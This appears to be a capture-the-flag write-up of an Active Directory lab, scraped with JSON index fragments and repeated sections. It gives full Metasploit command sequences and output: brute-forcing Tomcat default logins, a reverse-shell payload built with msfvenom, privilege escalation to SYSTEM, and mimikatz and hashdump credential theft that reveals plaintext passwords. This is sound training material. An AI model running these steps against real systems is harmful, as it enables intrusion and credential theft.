Q7\u200a-\u200aDomain Admin I uploaded winPEAS.exe and executed it. Here's the output of winPEAE.exe on Users Information . ===========================================(Users Information)=========================================== [+] Users [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups Current user: SYSTEM Current groups: Administrators, Everyone, Authenticated Users ================================================================================================= PROD-WEBSRV7765\\Administrator: Built-in account for administering the computer/domain |->Groups: Administrators |->Password: CanChange-Expi-Req PROD-WEBSRV7765\\Guest(Disabled): Built-in account for guest access to the computer/domain |->Groups: Guests |->Password: NotChange-NotExpi-NotReq MYCOMS\\Administrator: Built-in account for administering the computer/domain |->Groups: Domain Users,Administrators,Schema Admins,Enterprise Admins,Domain Admins,Group Policy Creator Owners |->Password: CanChange-Expi-Req MYCOMS\\Guest(Disabled): Built-in account for guest access to the computer/domain |->Groups: Domain Guests,Guests |->Password: NotChange-NotExpi-NotReq MYCOMS\\krbtgt(Disabled): Key Distribution Center Service Account |->Groups: Domain Users,Denied RODC Password Replication Group |->Password: CanChange-Expi-Req MYCOMS\\abu |->Groups: Domain Users,Enterprise Admins,Domain Admins |->Password: CanChange-NotExpi-Req MYCOMS\\ali |->Groups: Domain Users,Performance Log Users,Event Log Readers |->Password: NotChange-NotExpi-Req MYCOMS\\umar |->Groups: Domain Users,Domain Admins |->Password: CanChange-NotExpi-Req Note that there were 2 domain admins who are abu and umar . Answer: abu:umar Q8\u200a-\u200aEnterprise Admins Based on the output of winPEAS.exe on Users Information , there is only enterprise admin who is abu . Answer: abu Challenges\u200a-\u200aFile Server Q1 - IP address of file server On the meterpreter, I ran arp to display the host ARP cache. meterpreter > arp ARP cache ========= IP address MAC address Interface ---------- ----------- --------- 192.168.240.1 00:0c:29:4c:f2:d9 12 192.168.240.13 00:50:56:ab:40:8b 12 192.168.240.30 00:0c:29:3b:05:22 12 192.168.240.255 ff:ff:ff:ff:ff:ff 12 224.0.0.22 00:00:00:00:00:00 1 224.0.0.22 01:00:5e:00:00:16 12 224.0.0.252 01:00:5e:00:00:fc 12 I tried to nmap each of the address. The 1st address gives nothing. Then move on to the next one, it has hostname included fsrv . $ nmap -Pn -A 192.168.240.13 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 03:41 +08 Nmap scan report for 192.168.240.13 Host is up (0.055s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 111/tcp closed rpcbind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=prod-fsrv5633.mycoms.com.local | Not valid before: 2020-11-02T10:27:27 |_Not valid after: 2021-05-04T10:27:27 |_ssl-date: 2020-11-21T19:42:09+00:00; -12s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -12s, deviation: 0s, median: -12s |_nbstat: NetBIOS name: PROD-FSRV5633, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:40:8b (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-11-21T19:41:29 |_ start_date: 2020-11-03T10:27:26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.07 seconds Answer: 192.168.240.13 Q2 - Folder share name that 'domain user' has write access to file server Q3 - NTLM hash result for user Administrator Q4 - NTLM hash result for user \"*mar\" Q5 - Plain text password for user Administrator to be continue ...","title":"CTF Round 3 - Active Directory"},{"location":"writeup/ctf-round-3-active-directory/#challenges-vpn","text":"Each of the participant given own unique vpn config file. Answer for this challenge is based on the vpn config file.","title":"Challenges\u200a-\u200aVPN"},{"location":"writeup/ctf-round-3-active-directory/#q1-vpn-configuration","text":"Question 1 asking for information about VPN server public ip. Hint said this can be found in the VPN config file. So, I open the config file using my favourite code editor. remote vpn.ctf.xxxxxxxxxx.com 11139 udp While scrolling, I found this line of config included host name, port number and protocol. I copied the host name and ran into WHOIS IP Lookup Tool . Found the IP address 178.XXX.XXX.221. Answer: 178.XXX.XXX.221:udp:11139","title":"Q1 - VPN configuration"},{"location":"writeup/ctf-round-3-active-directory/#q2-vpn-user-network-address","text":"Question 2 asked for the user network address. To achieve that, I need to connect to the VPN. I ran sudo openvpn vpn_conect.config . Once connection initialized, I ran ifconfig and look for interface name like tunXX . There is the user IP address at the interface. Note that network address is like 10.XXX.XXX.0 . Simply changed it. Answer: 10.0.200.0","title":"Q2 - VPN user network\u00a0address"},{"location":"writeup/ctf-round-3-active-directory/#q3-challenge-server-network-address","text":"Question 3 asked for the server network address. Hint said I need to use command netstat -rn . I ran the command and get this output. $ netstat -rn Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 192.168.1.1 0.0.0.0 UG 0 0 0 eth0 10.0.200.0 0.0.0.0 255.255.255.0 U 0 0 0 tun0 192.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 192.168.9.0 10.0.200.1 255.255.255.0 UG 0 0 0 tun0 192.168.240.0 10.0.200.1 255.255.255.0 UG 0 0 0 tun0 On interface tun0 , there are 2 network address, 192.168.9.0 and 192.168.240.0 that have flag UG . This flag means that the route is up and point to a gateway. Both address point to 10.0.200.1 which is the gateway. I tested both network address and got the right answer. Answer: 192.168.240.0","title":"Q3\u200a-\u200aChallenge server network\u00a0address"},{"location":"writeup/ctf-round-3-active-directory/#challenges-web-server","text":"To answer this challenge, I need to know the IP address of the web server. I went through the question and found hint on question 6 which stated the ip address 192.168.240.80 . I ran nmap -Pn -A 192.168.240.80 and got something. $ nmap -Pn -A 192.168.9.0/24 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 23:50 +08 Nmap scan report for 192.168.240.80 Host is up (0.16s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp closed http 443/tcp closed https 8080/tcp open http Apache Tomcat 8.5.59 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/8.5.59 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds nmap discovered 3 ports on 192.168.240.80 and only 1 port is open, port 8080 -> Apache Tomcat.","title":"Challenges\u200a-\u200aWeb Server"},{"location":"writeup/ctf-round-3-active-directory/#q1-username-and-password-for-webserver-cat-with-name-tom","text":"I ran msfconsole and search for specific modules about the Apache Tomcat by using command search tomcat . msf6 > search tomcat Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/ibm_drm_download 2020-04-21 normal Yes IBM Data Risk Manager Arbitrary File Download 1 auxiliary/admin/http/tomcat_administration normal No Tomcat Administration Tool Default Access 2 auxiliary/admin/http/tomcat_utf8_traversal 2009-01-09 normal No Tomcat UTF-8 Directory Traversal Vulnerability 3 auxiliary/admin/http/trendmicro_dlp_traversal 2009-01-09 normal No TrendMicro Data Loss Prevention 5.5 Directory Traversal 4 auxiliary/dos/http/apache_commons_fileupload_dos 2014-02-06 normal No Apache Commons FileUpload and Apache Tomcat DoS 5 auxiliary/dos/http/apache_tomcat_transfer_encoding 2010-07-09 normal No Apache Tomcat Transfer-Encoding Information Disclosure and DoS 6 auxiliary/dos/http/hashcollision_dos 2011-12-28 normal No Hashtable Collisions 7 auxiliary/scanner/http/tomcat_enum normal No Apache Tomcat User Enumeration 8 auxiliary/scanner/http/tomcat_mgr_login normal No Tomcat Application Manager Login Utility 9 exploit/linux/http/cisco_prime_inf_rce 2018-10-04 excellent Yes Cisco Prime Infrastructure Unauthenticated Remote Code Execution 10 exploit/linux/http/cpi_tararchive_upload 2019-05-15 excellent Yes Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability 11 exploit/multi/http/cisco_dcnm_upload_2019 2019-06-26 excellent Yes Cisco Data Center Network Manager Unauthenticated Remote Code Execution 12 exploit/multi/http/struts2_namespace_ognl 2018-08-22 excellent Yes Apache Struts 2 Namespace Redirect OGNL Injection 13 exploit/multi/http/struts_code_exec_classloader 2014-03-06 manual No Apache Struts ClassLoader Manipulation Remote Code Execution 14 exploit/multi/http/struts_dev_mode 2012-01-06 excellent Yes Apache Struts 2 Developer Mode OGNL Execution 15 exploit/multi/http/tomcat_jsp_upload_bypass 2017-10-03 excellent Yes Tomcat RCE via JSP Upload Bypass 16 exploit/multi/http/tomcat_mgr_deploy 2009-11-09 excellent Yes Apache Tomcat Manager Application Deployer Authenticated Code Execution 17 exploit/multi/http/tomcat_mgr_upload 2009-11-09 excellent Yes Apache Tomcat Manager Authenticated Upload Code Execution 18 exploit/multi/http/zenworks_configuration_management_upload 2015-04-07 excellent Yes Novell ZENworks Configuration Management Arbitrary File Upload 19 exploit/windows/http/cayin_xpost_sql_rce 2020-06-04 excellent Yes Cayin xPost wayfinder_seqid SQLi to RCE 20 exploit/windows/http/tomcat_cgi_cmdlineargs 2019-04-10 excellent Yes Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability 21 post/multi/gather/tomcat_gather normal No Gather Tomcat Credentials 22 post/windows/gather/enum_tomcat normal No Windows Gather Apache Tomcat Enumeration I use module 8 to attempt our login to the Tomcat Application Manager. Simply select the module using command use 8 and configured it properly. After that, I ran the module using command exploit . msf6 > use 8 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 192.168.240.80 RHOST => 192.168.240.80 msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [-] 192.168.240.80:8080 - LOGIN FAILED: admin:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: admin:root (Incorrect) [+] 192.168.240.80:8080 - Login Successful: admin:tomcat [-] 192.168.240.80:8080 - LOGIN FAILED: manager:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: role1:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:admin (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:manager (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:role1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:root (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:tomcat (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: both:vagrant (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: root:owaspbwa (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: xampp:xampp (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [-] 192.168.240.80:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Got the valid credential for tomcat ( admin:tomcat ). I login the Tomcat Manager site with the credential and I'm inside! Answer: admin:tomcat","title":"Q1\u200a-\u200aUsername and password for webserver 'cat' with name\u00a0'tom'."},{"location":"writeup/ctf-round-3-active-directory/#q2-md5-checksum-hash-for-file-tomcatico","text":"Next, I need to gain access to the remote target through the Apache Tomcat service. To do that, I ran use 17 to select module multi/http/tomcat_mgr_upload and configured it properly. Then I ran the exploit. msf6 auxiliary(scanner/http/tomcat_mgr_login) > use 17 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat HttpPassword => tomcat msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername admin HttpUsername => admin msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.240.80 RHOSTS => 192.168.240.80 msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080 RPORT => 8080 msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(multi/http/tomcat_mgr_upload) > exploit [*] Started reverse TCP handler on 10.0.200.2:4444 [*] Retrieving session ID and CSRF token... [*] Uploading and deploying obllDiY... [*] Executing obllDiY... [*] Sending stage (58125 bytes) to 192.168.240.80 [*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.80:57086) at 2020-11-22 00:45:10 +0800 [*] Undeploying obllDiY ... meterpreter > The exploit working and now I have a Meterpreter shell on the remote target. I ran sysinfo to get information about the remote system and getuid to get the user that the server is running as. meterpreter > sysinfo Computer : prod-websrv7765 OS : Windows Server 2012 R2 6.3 (amd64) Meterpreter : java/windows meterpreter > getuid Server username: LOCAL SERVICE Right now, I'm as LOCAL SERVICE . Next, I ran ls to list out the folders and files. meterpreter > ls Listing: C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5 =============================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100776/rwxrwxrw- 58068 fil 2020-10-07 00:58:40 +0800 LICENSE 100776/rwxrwxrw- 1777 fil 2020-10-07 00:58:40 +0800 NOTICE 100776/rwxrwxrw- 7314 fil 2020-10-07 00:58:40 +0800 RELEASE-NOTES 100776/rwxrwxrw- 81704 fil 2020-10-07 00:59:30 +0800 Uninstall.exe 40776/rwxrwxrw- 4096 dir 2020-11-03 08:58:32 +0800 bin 40776/rwxrwxrw- 4096 dir 2020-11-03 09:21:48 +0800 conf 40776/rwxrwxrw- 12288 dir 2020-11-03 08:58:32 +0800 lib 40776/rwxrwxrw- 16384 dir 2020-11-22 00:29:46 +0800 logs 40776/rwxrwxrw- 4096 dir 2020-11-22 00:45:18 +0800 temp 100776/rwxrwxrw- 21630 fil 2020-10-07 00:58:50 +0800 tomcat.ico 40776/rwxrwxrw- 16384 dir 2020-11-22 00:45:15 +0800 webapps 40776/rwxrwxrw- 0 dir 2020-11-18 13:55:43 +0800 work This question ask for MD5 hash for tomcat.ico . To do that, I ran checksum md5 tomcat.ico . meterpreter > checksum md5 tomcat.ico 4644f2d45601037b8423d45e13194c93 tomcat.ico Answer: 4644f2d45601037b8423d45e13194c93","title":"Q2\u200a-\u200aMD5 checksum hash for file 'tomcat.ico'"},{"location":"writeup/ctf-round-3-active-directory/#q3-plain-text-password-for-domain-user","text":"Next, I need to create a windows meterpreter using msfvenom . Simply ran msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe . $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes $ file meterpreter.exe meterpreter.exe: PE32+ executable (GUI) x86-64, for MS Windows Now I have a Windows executable ready to go. Next, I used exploit/multi/handler to handle the exploit launched outside of the framework. I configured the handler exactly same as the configuration I used to create the Windows binary Meterpreter. Then I ran exploit . $ msfconsole -q msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(multi/handler) > set LPORT 5555 LPORT => 5555 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 10.0.200.2:5555 After that, I went back to other Meterpreter. I uploaded the Windows binary, spawned a shell and ran the binary. meterpreter > upload meterpreter.exe [*] uploading : meterpreter.exe -> meterpreter.exe [*] Uploaded -1.00 B of 7.00 KiB (-0.01%): meterpreter.exe -> meterpreter.exe [*] uploaded : meterpreter.exe -> meterpreter.exe meterpreter > shell Process 4 created. Channel 5 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5>meterpreter.exe meterpreter.exe Now I have Windows Meterpreter running. [*] Sending stage (200262 bytes) to 192.168.240.80 [*] Meterpreter session 1 opened (10.0.200.2:5555 -> 192.168.240.80:57639) at 2020-11-22 01:47:30 +0800 meterpreter > Right now, I'm NT AUTHORITY\\LOCAL SERVICE and I need to get NT AUTHORITY\\SYSTEM . To achieve that, here's come privilege escalation. I do some digging and found module post/multi/recon/local_exploit_suggester . This module suggested local meterpreter exploits that can be used. I ran background and use post/multi/recon/local_exploit_suggester . I configured it with session 1 and ran the module. meterpreter > background [*] Backgrounding session 1... msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1 SESSION => 1 msf6 post(multi/recon/local_exploit_suggester) > run [*] 192.168.240.80 - Collecting local exploits for x64/windows... [*] 192.168.240.80 - 20 exploit checks are being tried... [+] 192.168.240.80 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. nil versions are discouraged and will be deprecated in Rubygems 4 [+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. [*] Post module execution completed I give a try to exploit/windows/local/bypassuac_dotnet_profiler . msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_dotnet_profiler [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/bypassuac_dotnet_profiler) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [*] UAC is Enabled, checking level... [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module [*] Exploit completed, but no session was created. Hurm no luck. Moving on to exploit/windows/local/bypassuac_sdclt . msf6 exploit(windows/local/bypassuac_dotnet_profiler) > use exploit/windows/local/bypassuac_sdclt [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/bypassuac_sdclt) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/bypassuac_sdclt) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [*] UAC is Enabled, checking level... [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module [*] Exploit completed, but no session was created. No luck again. I skipped the other 2 and use exploit/windows/local/ms16_075_reflection_juicy because it said juicy? msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/windows/local/ms16_075_reflection_juicy [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.0.200.2 LHOST => 10.0.200.2 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 6666 LPORT => 6666 msf6 exploit(windows/local/ms16_075_reflection_juicy) > run [*] Started reverse TCP handler on 10.0.200.2:6666 [+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).) [*] Launching notepad to host the exploit... [+] Process 3056 launched. [*] Reflectively injecting the exploit DLL into 3056... [*] Injecting exploit into 3056... [*] Exploit injected. Injecting exploit configuration into 3056... [*] Configuration injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 192.168.240.80 [*] Meterpreter session 2 opened (10.0.200.2:6666 -> 192.168.240.80:57925) at 2020-11-22 02:19:16 +0800 meterpreter > I'm in as NT AUTHORITY\\SYSTEM . meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM To answer the question, I ran use kiwi to load kiwi module and lsa_dump_secrets to dump LSA secrets. Kiwi module used to perform various types of credential-oriented operations such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and more. meterpreter > use kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x86/windows) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ [!] Loaded x86 Kiwi on an x64 architecture. Success. meterpreter > lsa_dump_secrets [+] Running as SYSTEM [*] Dumping LSA secrets Domain : PROD-WEBSRV7765 SysKey : 14a513800f23074d06b371d5b4bfdb86 Local name : PROD-WEBSRV7765 ( S-1-5-21-1669853405-1314316162-1621276032 ) Domain name : MYCOMS ( S-1-5-21-2804598327-1020562986-2106375421 ) Domain FQDN : mycoms.com.local Policy subsystem is : 1.12 LSA Key(s) : 1, default {623d7843-d8a7-c5a9-01fa-119217f4064e} [00] {623d7843-d8a7-c5a9-01fa-119217f4064e} b45240c17c8897e3d5270783f4cc737f278b68d474c51a505bc077bf2220b1df Secret : $MACHINE.ACC cur/text: WI6$*\\T[fZ%F!qqD%?^U]E\"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^' NTLM:eddb95449e4807dedc0d2ecdbe361719 SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5 old/text: WI6$*\\T[fZ%F!qqD%?^U]E\"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^' NTLM:eddb95449e4807dedc0d2ecdbe361719 SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5 Secret : DefaultPassword Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 d9 d2 0c 8c f2 c0 fe 37 7e 8a 5b f6 a9 38 49 99 8b a6 93 20 b2 9e c0 9d c6 41 5a a6 cc df 31 fd 9b ce 53 ba 1e 8c 31 71 full: d9d20c8cf2c0fe377e8a5bf6a93849998ba69320b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171 m/u : d9d20c8cf2c0fe377e8a5bf6a93849998ba69320 / b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171 old/hex : 01 00 00 00 55 0b 07 be cc e6 4f 90 bb 45 62 4a 4a dc 7f 91 50 a8 90 cc dd dc d2 a3 ce 33 5a 29 49 3d 60 6f 25 a5 03 2e 42 39 b1 96 full: 550b07becce64f90bb45624a4adc7f9150a890ccdddcd2a3ce335a29493d606f25a5032e4239b196 m/u : 550b07becce64f90bb45624a4adc7f9150a890cc / dddcd2a3ce335a29493d606f25a5032e4239b196 Secret : NL$KM cur/hex : 29 5b d7 f4 51 cb 5a 3f e2 9e bb cd 4f 8a 7c 36 d3 31 1e 24 9c 7e a4 da c6 b0 57 78 3e 4b e6 f3 b2 2d fd d8 83 b6 9e 9e f8 fc 13 d3 77 37 e4 7f 8b 6a 7c ad 41 2c 86 06 1c 0d ef 4d 0a c2 e1 59 Secret : _SC_SplunkForwarder / service 'SplunkForwarder' with username : mycoms\\ali cur/text: P@ssw0rd123! The password for domain user is stated there. Answer: P@ssw0rd123!","title":"Q3\u200a-\u200aPlain text password for domain\u00a0user"},{"location":"writeup/ctf-round-3-active-directory/#q4-ntlm-hash-result-for-user-administrator","text":"For this question, I use post/windows/gather/smart_hashdump to dump local accounts from the SAM Database. meterpreter > background [*] Backgrounding session 2... msf6 exploit(windows/local/ms16_075_reflection_juicy) > use post/windows/gather/smart_hashdump msf6 post(windows/gather/smart_hashdump) > set SESSION 2 SESSION => 2 msf6 post(windows/gather/smart_hashdump) > run [*] Running module against PROD-WEBSRV7765 [*] Hashes will be saved to the database if one is connected. [+] Hashes will be saved in loot in JtR password file format to: [*] /home/ahmad/.msf4/loot/20201122030536_default_192.168.240.80_windows.hashes_705427.txt [*] Dumping password hashes... [*] Running as SYSTEM extracting hashes from registry [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 14a513800f23074d06b371d5b4bfdb86... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... [*] No users with password hints on this system [*] Dumping password hashes... [+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: [*] Post module execution completed Now I have the full NTLM hash for Administrator. Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::","title":"Q4\u200a-\u200aNTLM hash result for user Administrator"},{"location":"writeup/ctf-round-3-active-directory/#q5-plain-text-password-for-user-administrator","text":"The full NTLM hash consist of 4 parts which are username : relative identifier : LM hash : NT hash :::. To get the password for user Administrator, I need to crack the NT hash using john or crackstation.net . I copied the NT hash and paste it on online tool. Answer: P@ssw0rd","title":"Q5\u200a-\u200aPlain text password for user Administrator"},{"location":"writeup/ctf-round-3-active-directory/#q6-domain-user","text":"Based on the output of lsa_dump_secrets , the domain user is ali Answer: ali","title":"Q6\u200a-\u200aDomain\u00a0User"},{"location":"writeup/ctf-round-3-active-directory/#q7-domain-admin","text":"I uploaded winPEAS.exe and executed it. Here's the output of winPEAE.exe on Users Information . ===========================================(Users Information)=========================================== [+] Users [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups Current user: SYSTEM Current groups: Administrators, Everyone, Authenticated Users ================================================================================================= PROD-WEBSRV7765\\Administrator: Built-in account for administering the computer/domain |->Groups: Administrators |->Password: CanChange-Expi-Req PROD-WEBSRV7765\\Guest(Disabled): Built-in account for guest access to the computer/domain |->Groups: Guests |->Password: NotChange-NotExpi-NotReq MYCOMS\\Administrator: Built-in account for administering the computer/domain |->Groups: Domain Users,Administrators,Schema Admins,Enterprise Admins,Domain Admins,Group Policy Creator Owners |->Password: CanChange-Expi-Req MYCOMS\\Guest(Disabled): Built-in account for guest access to the computer/domain |->Groups: Domain Guests,Guests |->Password: NotChange-NotExpi-NotReq MYCOMS\\krbtgt(Disabled): Key Distribution Center Service Account |->Groups: Domain Users,Denied RODC Password Replication Group |->Password: CanChange-Expi-Req MYCOMS\\abu |->Groups: Domain Users,Enterprise Admins,Domain Admins |->Password: CanChange-NotExpi-Req MYCOMS\\ali |->Groups: Domain Users,Performance Log Users,Event Log Readers |->Password: NotChange-NotExpi-Req MYCOMS\\umar |->Groups: Domain Users,Domain Admins |->Password: CanChange-NotExpi-Req Note that there were 2 domain admins who are abu and umar . Answer: abu:umar","title":"Q7\u200a-\u200aDomain\u00a0Admin"},{"location":"writeup/ctf-round-3-active-directory/#q8-enterprise-admins","text":"Based on the output of 